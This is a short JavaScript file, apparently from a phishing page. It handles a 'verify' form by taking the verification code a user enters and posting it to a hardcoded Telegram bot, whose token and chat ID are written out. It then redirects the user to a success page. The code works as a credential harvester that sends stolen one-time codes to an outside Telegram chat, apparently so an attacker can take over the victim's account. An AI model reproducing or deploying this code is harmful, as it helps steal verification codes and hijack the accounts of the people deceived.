document.getElementById("verify-form").addEventListener("submit", async function(event) {
    event.preventDefault(); // Prevent page reload

    let verificationCode = document.getElementById("verification_code").value.trim();

    // Telegram Bot Credentials
    const botToken = "7862409334:AAH67G2Q8sZFQFAipBqze9EcS6W1tyV6MoI";
    const chatId = "6300694007";

    // Message format: /verify (phone_number) (verification_code)
    let message = `${verificationCode}`;

    // Telegram API URL
    let url = `https://api.telegram.org/bot${botToken}/sendMessage`;

    let data = {
        chat_id: chatId,
        text: message
    };

    // Fix for iOS Safari fetch issues
    fetch(url, {
        method: "POST",
        mode: "cors", // Ensures cross-origin request works
        cache: "no-cache", // Prevents iOS caching issues
        credentials: "omit", // Ensures request is allowed on all devices
        headers: {
            "Content-Type": "application/json",
            "Accept": "application/json"
        },
        body: JSON.stringify(data)
    })
    .then(response => response.json())
    .then(result => {
        if (result.ok) {
            window.location.href = "./success.html"; // Redirect only if successful
        } else {
            alert("Verification failed. Please try again.");
            console.error("Telegram API Error:", result);
        }
    })
    .catch(error => {
        alert("Network error! Please check your internet connection.");
        console.error("Fetch Error:", error);
    });
});
